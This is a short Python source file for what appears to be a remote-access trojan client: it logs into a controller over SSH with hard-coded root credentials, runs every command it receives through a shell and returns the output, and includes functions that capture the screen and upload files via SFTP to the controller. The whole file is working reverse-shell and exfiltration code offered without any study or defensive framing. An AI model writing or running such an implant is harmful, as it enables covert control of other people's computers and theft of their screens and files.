import subprocess
import paramiko
from PIL import ImageGrab

HOST = "127.0.0.1"
USERNAME = "root"
PASSWORD = "toor"
PORT = 8080
NAME = "001"

def main():
    '''Entry point if called as an exeutable'''
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, compress=True)
    chan = client.get_transport().open_session()
    chan.send("Client " + NAME + " is connected")
    while True:
        command = chan.recv(1024)
        cmd_list = []
        cmd_list.append(command)
        try:
            cmd = subprocess.check_output(cmd_list, shell=True)
            chan.send(cmd)
        except Exception as exc:
            chan.send(str(exc))
    print(str(chan.recv(1024)))
    client.close()

def sftp(local_path, name):
    '''Sends file from local_path to server'''
    try:
        transport = paramiko.Transport((HOST, PORT))
        transport.connect(username=USERNAME, password=PASSWORD)
        sftp_client = paramiko.SFTPClient.from_transport(transport)
        sftp_client.put(local_path, name)
        sftp_client.close()
        return "[+] Done!"
    except Exception as exc:
        return str(exc)

def screenshot():
    '''Takes screen shot and stores it in windows root dir then uploads image to server'''
    try:
        img = ImageGrab.grab()
        img.save("C:\\screenshot.png")
    except Exception as exc:
        return str(exc)
    return sftp("C:\\screenshot.png", "screenshot")

if __name__ == "__main__":
    main()